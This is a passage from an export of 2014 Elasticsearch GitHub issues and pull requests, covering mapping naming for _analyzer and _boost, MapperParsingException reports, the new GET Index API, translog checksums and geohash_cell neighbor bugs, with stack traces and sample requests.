2. `_analyzer` is currently not a field mapper at all and I think the documentation is lying: `"index": "no"` has no effect, the field will always use default configuration. 

In addition for consistency I think `_analyzer` should behave just like `_boost`, that is: Either the `"path"` in `_analyzer` should also be called `"name"` like in `_boost` or the other way round. Depending on what the decision is for 1. `_analyzer` should also behave that way.

So: Do we want the `_boost` to be the name for get field mapping requests or the name defined in `"name"`?
</comment><comment author="Mpdreamz" created="2014-09-01T15:19:41Z" id="54071220">I would expect the index boost information to be fixated using the `_boost` special name, the `name: boost` part is only metadata off the special `_boost` mapping.

In other words I map it use it the special `_boost` keyword I would expect to be able to fetch the information using `_boost` as well.
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-boost-field.html

this is also the behaviour for al the other `_specialfields` mappings.

In similar fashion `_analyzer` is a special field mapper if I'm not mistaken:
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/mapping-analyzer-field.html

It allows a document field to supply the default index time analyzer for fields dynamically during indexing. 

Since `_boost` is deprecated I would keep `path` for `_analyzer` and leave `name` for `_boost` even if `path` is the more descriptive property name.
</comment><comment author="brwe" created="2014-09-01T15:25:16Z" id="54071725">OK, I'll make `_analyzer` a proper field mapper, change the naming for get field mapping and also leave the `path` for `_analyzer` and `name` for `_boost`.
</comment><comment author="Mpdreamz" created="2015-02-23T15:33:33Z" id="75565565">Closing this because `_analyzer` will be removed in 2.0. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>MapperParsingException: Root type mapping not empty after parsing (while creating mapping with dynamic template)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7236</link><project id="" key="" /><description>Hi

ES version : 1.3.1
(Note : same code works with ES version 0.90.x)

i copied sample dynamic template mapping from [elasticsearch documentation](http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/custom-dynamic-mapping.html), which is as below. And getting same exception...

{
error: MapperParsingException[Root type mapping not empty after parsing! Remaining fields: [mappings : {my_type={dynamic_templates=[{es={match=_es, match_mapping_type=string, mapping={type=string, analyzer=spanish}}}, {en={match=, match_mapping_type=string, mapping={type=string, analyzer=english}}}]}}]]
status: 400
}

[2014-08-12 14:21:16,089][DEBUG][action.admin.indices.mapping.put] [Piper] failed to put mappings on indices [[test]], type [my_type]
org.elasticsearch.index.mapper.MapperParsingException: Root type mapping not empty after parsing! Remaining fields:   [mappings : {my_type={dynamic_templates=[{es={match=__es, match_mapping_type=string, mapping={type=string, analyzer=spanish}}}, {en={match=_, match_mapping_type=string, mapping={type=string, analyzer=english}}}]}}]
    at org.elasticsearch.index.mapper.DocumentMapperParser.parse(DocumentMapperParser.java:276)
    at org.elasticsearch.index.mapper.DocumentMapperParser.parseCompressed(DocumentMapperParser.java:190)
    at org.elasticsearch.index.mapper.MapperService.parse(MapperService.java:447)
    at org.elasticsearch.index.mapper.MapperService.parse(MapperService.java:437)
    at org.elasticsearch.cluster.metadata.MetaDataMappingService$4.execute(MetaDataMappingService.java:503)
    at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:328)
    at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
    at java.lang.Thread.run(Thread.java:745)

Any pointer ?

``` java
PUT /my_index
{
    "mappings": {
        "my_type": {
            "dynamic_templates": [
                { "es": {
                      "match":              "*_es", 
                      "match_mapping_type": "string",
                      "mapping": {
                          "type":           "string",
                          "analyzer":       "spanish"
                      }
                }},
                { "en": {
                      "match":              "*", 
                      "match_mapping_type": "string",
                      "mapping": {
                          "type":           "string",
                          "analyzer":       "english"
                      }
                }}
            ]
}}}
```

probably related to issue# [6304](https://github.com/elasticsearch/elasticsearch/issues/6304)
</description><key id="40054875">7236</key><summary>MapperParsingException: Root type mapping not empty after parsing (while creating mapping with dynamic template)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mohsinh</reporter><labels><label>feedback_needed</label></labels><created>2014-08-12T13:32:35Z</created><updated>2014-08-12T14:06:26Z</updated><resolved>2014-08-12T14:06:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-12T13:51:41Z" id="51916207">@mohsinh 

I just tried the request that you pasted above, and it worked perfectly.  Please provide a full recreation of the problem.
</comment><comment author="mohsinh" created="2014-08-12T14:06:26Z" id="51918230">ah looks like head plugin has some problem with PUT mapping !

tried in sense and curl, looks like its working. Thanks for the quick response ! :+1: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adjusted visibility for BroadcastShardOperationRequest subclasses and their constructors</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7235</link><project id="" key="" /><description>Adjusted visibility to package private for BroadcastShardOperationRequest subclasses and their constructors

Also replaced the String,int pair for index and shard_id with `ShardId` object that holds the same info and serializes it the same way too.
</description><key id="40053742">7235</key><summary>Adjusted visibility for BroadcastShardOperationRequest subclasses and their constructors</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T13:20:15Z</created><updated>2015-06-07T12:25:22Z</updated><resolved>2014-08-13T08:01:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T07:37:26Z" id="52018433">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added GET Index API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7234</link><project id="" key="" /><description>Returns information about settings, aliases, warmers, and mappings. Basically returns the IndexMetadata.

Closes #4069
</description><key id="40052469">7234</key><summary>Added GET Index API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Index APIs</label><label>feature</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T13:03:34Z</created><updated>2015-06-06T18:22:50Z</updated><resolved>2014-09-11T10:33:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-12T13:05:36Z" id="51910565">@jpountz Comment from @clintongormley was that it would be good to move the logic for the /{index}/_warmers|_mappings|_settings|_alaises/{name} etc into the same action.  I think this is a good idea but I am wondering if it should be done in this change or in another ticket?
</comment><comment author="jpountz" created="2014-08-12T14:05:14Z" id="51918064">The idea sounds good to me as well but this code is not the one I know best, maybe @javanna can comment?
</comment><comment author="javanna" created="2014-08-12T15:02:58Z" id="51926549">Looks good, I left some comments and summoned @clintongormley to have a look api-wise :) I think we should isolate the breaking changes (removal of REST endpoints in favour of the new ones) to another PR and discuss them there.
</comment><comment author="colings86" created="2014-08-13T14:10:58Z" id="52052906">@javanna implemented the changes you suggested and left a few comment too
</comment><comment author="javanna" created="2014-08-13T15:31:57Z" id="52064993">Done another review round, the main thought is that this should become a proper java api given that the goal is to replace get settings and co. Most of the code that currently is in `RestIndicesGetAction` should move to a `TransportAction` and the api should be added to the `Client`. Left other few comments, looks good in general though!
</comment><comment author="rashidkpc" created="2014-08-27T22:55:37Z" id="53652465">I wonder if we should rationalize the responses between `/_all/_whatever` and `/_whatever`? I'm not totally clear how they're related, but we have a corresponding root endpoint for all of these. Some are pluralized, some are not, some return the same data in the same format (_mapping, _settings), others return in a different format. (_aliases, _warmer)

I noticed this doesn't remove `/_aliases`, however `/index/_aliases` returns a different format when no aliases are present than `/_aliases`. I wonder if we should return a key with an empty object for things that the user requests but don't exist, like `_/aliases` does:

**/_aliases**

```
   "logstash-2014.08.22": {
      "aliases": {}
   }
```

**/_all/_aliases**

```
   "logstash-2014.08.22": {}
```

There's also this difference between `/_warmer` and `/_all/_warmer`

**/_warmer**

```
{}
```

**/_all/_warmer/**

```
"logstash-2014.08.22": {}
```

Thoughts?
</comment><comment author="javanna" created="2014-08-28T10:45:04Z" id="53703942">Nice work @colings86 left a few comments
</comment><comment author="clintongormley" created="2014-09-06T14:57:20Z" id="54714523">I agree with Rashid's comments: https://github.com/elasticsearch/elasticsearch/pull/7234#issuecomment-53652465
- `GET /_all/_xxx` should return the same response as `GET /_xxx`, with a placeholder for the requested item if i is empty
- We should support the same plurals with `GET /_xxx` as with `GET /_all/_xxx`

I realise this is a breaking change, but it would make things consistent.
</comment><comment author="javanna" created="2014-09-10T09:44:19Z" id="55093030">This is very close, left a few minor comments. One more thing, we have quite some coverage through REST tests but now that the api is a proper client action I would love to see also some java integration tests for it.
</comment><comment author="javanna" created="2014-09-11T10:12:13Z" id="55244804">LGTM thanks @colings86 !
</comment><comment author="rashidkpc" created="2014-09-17T19:40:16Z" id="55948380">Potentially major issue, the new API doesn't appear to support `ignore_missing`

Elasticsearch 1.3.2

```
curl -XGET  http://localhost:9200/logstash-2014.09.16,logstash-2014.09.17/_aliases?ignore_missing=true;echo
{"logstash-2014.09.16":{"aliases":{}}}
```

Elasticsearch 1.4 branch

```
$ curl -XGET  http://localhost:9200/logstash-2014.09.16,logstash-2014.09.17/_aliases?ignore_missing=true;echo
{"error":"IndexMissingException[[logstash-2014.09.17] missing]","status":404}
```
</comment><comment author="colings86" created="2014-09-18T13:56:24Z" id="56041378">@rashidkpc the ignore_missing was replaced in 1.x by the parameters described in [1]. The aliases api performs a cluster state request which doesn't allow setting indices options and is lenient (i.e. doesn't error on missing indices) so the ignore_missing option actually had no effect in 1.3.2. The difference now is that the GET Index API does support indices options and defaults to strictExpandOpen which is in line with the other APIs and so will error on missing indices.  I will add the change to the breaking changes documentation but if you add the `ignore_unavailable` query  parameter instead you should get the desired functionality.

[1] http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/_parameters.html#_parameters
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NoSuchMethodError: com.spatial4j.core.shape.jts.JtsGeometry when indexing multipolygon field in 1.3.1 - worked in 1.0.3</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7233</link><project id="" key="" /><description>Works perfectly in 1.0.3, however when i upgrade to 1.3.1 i'm not able to index the 'location' field and it gives a NoSuchMethodError.

If i switch back to 1.0.3 it works again.

This is the document that i'm trying to index

``` json
{
  "location" : { "coordinates" : [ [ [ [ 0.44340355238491003,
                51.447780163517997
              ],
              [ 0.86259117505726002,
                51.180082750148003
              ],
              [ 1.0082709471378,
                50.816892583551997
              ],
              [ 0.84721779622765003,
                50.456505242372998
              ],
              [ 0.42802525366600003,
                50.194415245157998
              ],
              [ -0.13716299999998999,
                50.098842883365002
              ],
              [ -0.70235125366599005,
                50.194415245157998
              ],
              [ -1.1215437962276,
                50.456505242372998
              ],
              [ -1.2825969471376999,
                50.816892583551997
              ],
              [ -1.1369171750574001,
                51.180082750148003
              ],
              [ -0.71772955238489999,
                51.447780163517997
              ],
              [ 0.44340355238491003,
                51.447780163517997
              ]
            ] ] ],
      "type" : "multipolygon"
    },
  "modified" : 1388708645,
  "text" : "My profile"
}
```

The field mapping for location looks like this:

``` php
'location' =&gt; [
                                    'type'      =&gt; 'geo_shape',
                                    'tree'      =&gt; 'quadtree',
                                    'precision' =&gt; '1m'
                                ],
```

The stacktrace during indexing is:

```
org.elasticsearch.index.mapper.MapperParsingException: failed to parse
        at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
        at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
        at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
        at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
        at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:527)
        at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:426)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)
Caused by: java.lang.NoSuchMethodError: com.spatial4j.core.shape.jts.JtsGeometry.&lt;init&gt;(Lcom/vividsolutions/jts/geom/Geometry;Lcom/spatial4j/core/context/jts/JtsSpatialContext;ZZ)V
        at org.elasticsearch.common.geo.builders.ShapeBuilder.jtsGeometry(ShapeBuilder.java:85)
        at org.elasticsearch.common.geo.builders.MultiPolygonBuilder.build(MultiPolygonBuilder.java:76)
        at org.elasticsearch.index.mapper.geo.GeoShapeFieldMapper.parse(GeoShapeFieldMapper.java:234)
        at org.elasticsearch.index.mapper.object.ObjectMapper.serializeObject(ObjectMapper.java:549)
        at org.elasticsearch.index.mapper.object.ObjectMapper.parse(ObjectMapper.java:491)
        at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:534)
        ... 8 more
```
</description><key id="40048706">7233</key><summary>NoSuchMethodError: com.spatial4j.core.shape.jts.JtsGeometry when indexing multipolygon field in 1.3.1 - worked in 1.0.3</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">richardwyke</reporter><labels><label>:Geo</label><label>feedback_needed</label></labels><created>2014-08-12T12:10:42Z</created><updated>2015-02-28T04:50:37Z</updated><resolved>2015-02-28T04:50:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-19T16:46:05Z" id="52662867">@richardwyke I have tried to reproduce your issue using the 1.3.1 download without success using the commands in the following gist [1]. Can you please confirm that these are the steps to reproduce the issue?

It might also be worth trying to reproduce the issue on a fresh install of Elasticsearch to rule out missing or corrupted files in your current cluster.

[1] https://gist.github.com/colings86/49830355a9879e0d6e86
</comment><comment author="clintongormley" created="2014-11-10T19:54:57Z" id="62444007">Hi @richardwyke 

Any more information about recreating this problem?
</comment><comment author="clintongormley" created="2015-02-28T04:50:36Z" id="76510548">No more info provided. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add translog checksums</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7232</link><project id="" key="" /><description>Switches TranslogStreams to check a header in the file to determine the
translog format, delegating to the version-specific stream.

Version 1 of the translog format writes a `0xffff_ffff_0000_0001` header
at the beginning of the file and appends a checksum for each translog
operation written.

Also refactors much of the translog operations, such as merging
.hasNext() and .next() in FsChannelSnapshot

Relates to #6554
</description><key id="40039335">7232</key><summary>Add translog checksums</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">dakrone</reporter><labels><label>:Translog</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T09:43:29Z</created><updated>2015-06-07T12:25:35Z</updated><resolved>2014-08-27T13:30:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-20T15:07:59Z" id="52791780">I left a bunch of comments. I personally think we should add the checksum calculation on the TranslogStream level somehow instead of doing it on each operation. we should have an StreamOutput impl that calculates the checksum as well as a StreamInput that makes it entirely transparent. I am also worried about the potential collision of the header so I think we should make use of the index version to detect if we can use the new version of the translog
</comment><comment author="s1monw" created="2014-08-25T15:08:50Z" id="53276274">I left some more comments, I think it's close though... I would really really like to see a test that does corrupt a translog on a node and then checks that we handle it correctly... I am not even sure what the correct behavior is but IMO we should fail the shard?
</comment><comment author="dakrone" created="2014-08-27T11:23:46Z" id="53556316">@s1monw added an integration test for this.
</comment><comment author="s1monw" created="2014-08-27T12:40:35Z" id="53566249">@dakrone this test looks awesome. Can we maybe add that it tells you if it corrupted a replica and if so we make sure that the replica is allocated on another node? if you wanna do that afterwards I am ok with pushing this as it is...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Java API: CreateIndexRequestBuilder.addMapping should throw exc if that type already has a mapping</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7231</link><project id="" key="" /><description>I think it's trappy today, that .addMapping makes it seem like you can merge in mappings for different fields in the same type, whereas what it actually does is silently overwrite any previous .addMapping for that type.
</description><key id="40037676">7231</key><summary>Java API: CreateIndexRequestBuilder.addMapping should throw exc if that type already has a mapping</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T09:19:55Z</created><updated>2014-09-10T19:33:01Z</updated><resolved>2014-08-12T18:32:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Fresh variant of MapperParsingException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7230</link><project id="" key="" /><description>I created a gist for the mappings I am sending through node-es, with a returned error:
MapperParsingException[Root type mapping not empty after parsing!

The gist is at
https://gist.github.com/KnowledgeGarden/b965b7e78f19f9be9025

I'm wondering if anyone recognizes an error in my mapping. I deliberately include the index and type in the mapping.

Thanks!
</description><key id="40025095">7230</key><summary>Fresh variant of MapperParsingException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">KnowledgeGarden</reporter><labels /><created>2014-08-12T05:12:30Z</created><updated>2014-08-12T14:06:36Z</updated><resolved>2014-08-12T06:07:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-12T06:07:24Z" id="51876907">Please use the mailing list for questions. We can definitely help you there.
Also, add to your gist the code you wrote to send your mapping.
</comment><comment author="clintongormley" created="2014-08-12T08:08:42Z" id="51885140">@KnowledgeGarden In recent versions of ES we check for settings in the mapping that shouldn't be there and report an error where previously we just ignored it.

Check your mapping :)
</comment><comment author="KnowledgeGarden" created="2014-08-12T14:06:36Z" id="51918256">"Check your mappng :)!!!"
Indeed!
I will use the email list, but know this: the mapping is valid ala jsonlint; and no actual errors were reported--nothing out of place, etc. Just that Root type mapping not empty after parsing, with a list of what's left, which, oddly enough, is everything.  That error gets a lot of play in a websearch, but never anything a close analog of what I'm trying to do. I only have a few examples online, and perhaps they are dated.
Many thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Why my buckets's doc_count is limit to 3000?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7229</link><project id="" key="" /><description>this is piece of my buckets:
...
{
"key_as_string":"2014.08.12.04.35.00",
"key":1407818100000,
"doc_count":3000,
"total_sent":{
"value":9.321402E7
}
},
{
"key_as_string":"2014.08.12.04.35.02",
"key":1407818102000,
"doc_count":3000,
"total_sent":{
"value":1.07740186E8
}
},
{
"key_as_string":"2014.08.12.04.35.04",
"key":1407818104000,
"doc_count":3000,
"total_sent":{
"value":1.00685842E8
}
}
...

I have a lot of log to push to ES, 
Is ES have a limit with 3000qps??
</description><key id="40024037">7229</key><summary>Why my buckets's doc_count is limit to 3000?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">askdaddy</reporter><labels /><created>2014-08-12T04:38:44Z</created><updated>2014-08-12T06:10:32Z</updated><resolved>2014-08-12T06:10:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-12T06:10:31Z" id="51877083">Please use the mailing list for your questions. We can help you there.
Also, provide more details about what you are doing, such as query and the full result.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Clarify if non-bitset filters can be added to bool filters (without the need for or/and, etc..)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7228</link><project id="" key="" /><description>Traditionally, we have recommended to wrap mixed bitset and non-bitset filters in and/or/not, and place the bitset filters first, eg.

```
{
  "and" : [
    {
      "bool" : {
        "must" : [
          { "term" : {} },
          { "range" : {} },
          { "term" : {} }
        ]
      }
    },
    { "custom_script" : {} },
    { "geo_distance" : {} }
  ]
}
```

Recent conversations with dev revealed that the bool filter has been improved to be aware of non-bitset filters and automatically moves them to the end, so that they are executed after any bitset filters (and this change may have already be in 0.90.x).   @clintongormley also ran a benchmark and just using bool for both non-bitset and bitset seems to perform fine.  Would be great to see a doc or blog update to confirm our current recommendation, eg. if there is still a need to use and/or/not to separate out bitset and non-bitset filters, if they can now be combined within a bool, will the end user have to order them manually by "cost", or if it is automatic, etc.. And starting in what version the change was made, etc..
</description><key id="40013657">7228</key><summary>Clarify if non-bitset filters can be added to bool filters (without the need for or/and, etc..)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ppf2</reporter><labels><label>docs</label></labels><created>2014-08-12T00:15:53Z</created><updated>2014-11-08T13:46:36Z</updated><resolved>2014-11-08T13:46:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-08T13:46:36Z" id="62258195">Actually, i'd rather remove the and/or/not filters so that there is no confusion, or reimplement them using the bool filter internally.  Users shouldn't have to think about this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make geohash_cell filter understand distances</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7227</link><project id="" key="" /><description>The `geohash_cell` filter today uses the `precision` parameter to choose the level of geohash that it will query.  Really, `neighbors` should be `true` to get meaningful results, because a point may fall in a corner of a geohash cell and otherwise exclude locations which in reality are closer than the specified precision.

But setting a precision of `2km` actually results in a precision of about `5km`, plus neighbors, will result in a search area of approx 25km x 25km.

Instead, this filter should calculate which cells it needs to check in order to find any locations roughly within `2km` of the specified point.  This would be much easier for the user to manage.
</description><key id="39996631">7227</key><summary>Make geohash_cell filter understand distances</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nknize/following{/other_user}', u'events_url': u'https://api.github.com/users/nknize/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nknize/orgs', u'url': u'https://api.github.com/users/nknize', u'gists_url': u'https://api.github.com/users/nknize/gists{/gist_id}', u'html_url': u'https://github.com/nknize', u'subscriptions_url': u'https://api.github.com/users/nknize/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/830187?v=4', u'repos_url': u'https://api.github.com/users/nknize/repos', u'received_events_url': u'https://api.github.com/users/nknize/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nknize/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nknize', u'type': u'User', u'id': 830187, u'followers_url': u'https://api.github.com/users/nknize/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>:Geo</label><label>discuss</label><label>feature</label></labels><created>2014-08-11T20:23:01Z</created><updated>2016-11-25T18:30:10Z</updated><resolved>2016-11-25T18:30:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-13T14:58:50Z" id="52060071">This filter is basically the same as the geo-distance filter except that it uses indexed terms instead of in memory data structures.  I suggest that we add a type parameter to the geo-distance filter (like the bounding box filter has) which has a memory option (does the same as geo-distance does now) and an indexed option (uses this method with some improvements to ensure the radius is close to the requested radius).

We will then be able to deprecate this filter and have the parser use the new geo-distance indexed option underneath.
</comment><comment author="clintongormley" created="2015-11-21T16:48:18Z" id="158661524">@nknize is the geo hash cell filter of any use at all with the GeoPoint v2 implementation?  Or should we remove it?
</comment><comment author="clintongormley" created="2016-11-25T18:30:10Z" id="263008578">geohash-cell filter has been removed in 5.0</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo: Geohash_cell produces bad neighbors</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7226</link><project id="" key="" /><description>```
GET /_validate/query?explain
{
  "query": {
    "filtered": {
      "filter": {
        "geohash_cell": {
          "location": {
            "lat": 51.521568,
            "lon": -0.141257
          },
          "precision": "100km",
          "neighbors": true
        }
      }
    }
  }
}
```

Returns geohashes:
-  `ebzs` - see http://geohash.2ch.to/ebzs
- `ebzu` - see http://geohash.2ch.to/ebzu
- `gcpt` - see http://geohash.2ch.to/gcpt
- `gcpv` - see http://geohash.2ch.to/gcpv
- `s0bh` - see http://geohash.2ch.to/s0bh
- `u10j` - see http://geohash.2ch.to/u10j

Only `gcpt`, `gpcv`, and `u10j` are in the right place. The others are in the Gulf of Guinea.
